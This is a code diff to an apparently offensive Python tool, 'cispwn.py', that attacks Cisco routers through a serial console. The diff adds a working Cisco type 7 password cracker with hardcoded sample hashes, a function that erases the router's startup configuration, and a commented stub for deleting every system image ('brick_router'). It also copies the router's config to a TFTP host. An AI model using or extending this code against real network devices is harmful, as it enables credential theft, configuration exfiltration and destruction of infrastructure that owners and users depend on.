@@ -60,8 +60,32 @@ def copy_config(console):
 		tftp_setup(console)
 	send_command(console,'copy startup-config tftp:')
 	send_command(console,'192.168.1.2')
-	send_command(console,'')
+	send_command(console,'cispwn-config')
 	copied = 1
+
+def crack_password(password):
+	plaintext = ''
+	xlat = "dsfd;kfoA,.iyewrkldJKDHSUBsgvca69834ncxv9873254k;fg87"
+	i = 2
+	val = 0
+	seed = (ord(password[0]) - 0x30) * 10 + ord(password[1]) - 0x30
+	while i < len(password):
+		if (i != 2 and not(i & 1)):
+			plaintext += chr(val ^ ord(xlat[seed]))
+			seed += 1
+			seed %= len(xlat)
+			val = 0
+		val *= 16
+		c=password[i]
+		if(c.isdigit()):
+			val += ord(password[i]) - 0x30
+		if(ord(password[i]) >= 0x41 and ord(password[i]) <= 0x46):
+			val += ord(password[i]) - 0x41 + 0x0a
+		i += 1
+	plaintext += chr(val ^ ord(xlat[seed]))
+	return plaintext
+
+
 
 
 def decrypt_passwords(console):
@@ -76,9 +100,14 @@ def randomize_passwords(console):
 		#parse the file for passwords, replace them with random encrypted passwords
 
 
-#def delete_config(console):
+def delete_config(console):
 	#delete the startup config file
+	send_command(console,'erase startup-config')
+	send_command(console,'')
+	print "config was deleted"
 
+#def brick_router(console):
+	#deletes every system image on the router, requires external image to get it working again.
 
 def read_serial(console):
 	#Checks to see if there are bytes waiting to be read, and reads them. If no bytes are found, it returns a null string.
@@ -112,13 +141,17 @@ def main(argv):
 			print 'cispwn.py ' + version
 			sys.exit()
 	print 'Yay!'
+	print crack_password("0835495D1D")
+	print crack_password("0822455D0A16")
+	print crack_password("08204E4D0D1C03101A02060F26262A2723243000130315164E40")
+	print crack_password("0835495D1D100B1043595F")
 	#console=serial.Serial(
-		#	port='COM1',
-		#	baudrate=9600,
-		#	parity="N"
-		#	stopbit=1,
-		#	bytesize=8
-		#	timeout=READ_TIMEOUT
+		#	port = 'COM1',
+		#	baudrate = 9600,
+		#	parity = "N"
+		#	stopbit = 1,
+		#	bytesize = 8
+		#	timeout = READ_TIMEOUT
 		#)
 	#if not console.isOpen():
 		#print 'Error, a connection could not be made'
